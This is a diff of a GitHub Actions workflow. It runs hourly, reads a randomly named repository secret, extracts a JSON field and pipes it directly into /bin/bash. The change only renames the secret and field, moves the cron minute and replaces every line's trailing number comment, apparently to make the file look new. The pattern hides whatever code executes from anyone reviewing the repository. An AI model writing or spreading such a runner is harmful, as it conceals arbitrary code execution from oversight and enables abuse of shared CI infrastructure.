@@ -1,15 +1,15 @@
-name: xingbensan0974 #6792
-on: #13605
-  workflow_dispatch: #29194
-  schedule: #1693
-    - cron: '12 * * * *' #28459
-jobs: #19889
-  build: #24991
-    runs-on: ubuntu-latest #24073
-    steps: #11295
-      - uses: actions/checkout@v4 #3357
-      - name: xingbensan0974 #2222
-        env: #16973
-          v2892: ${{ secrets.v2892 }} #22636
+name: xingbensan0974 #22724
+on: #18425
+  workflow_dispatch: #23698
+  schedule: #16178
+    - cron: '7 * * * *' #18397
+jobs: #33
+  build: #26254
+    runs-on: ubuntu-latest #3028
+    steps: #490
+      - uses: actions/checkout@v4 #28644
+      - name: xingbensan0974 #17250
+        env: #13050
+          n18394: ${{ secrets.n18394 }} #20863
         run: |
-          echo $v2892 | jq -r .e4104 | /bin/bash #17995
+          echo $n18394 | jq -r .m6110 | /bin/bash #17936
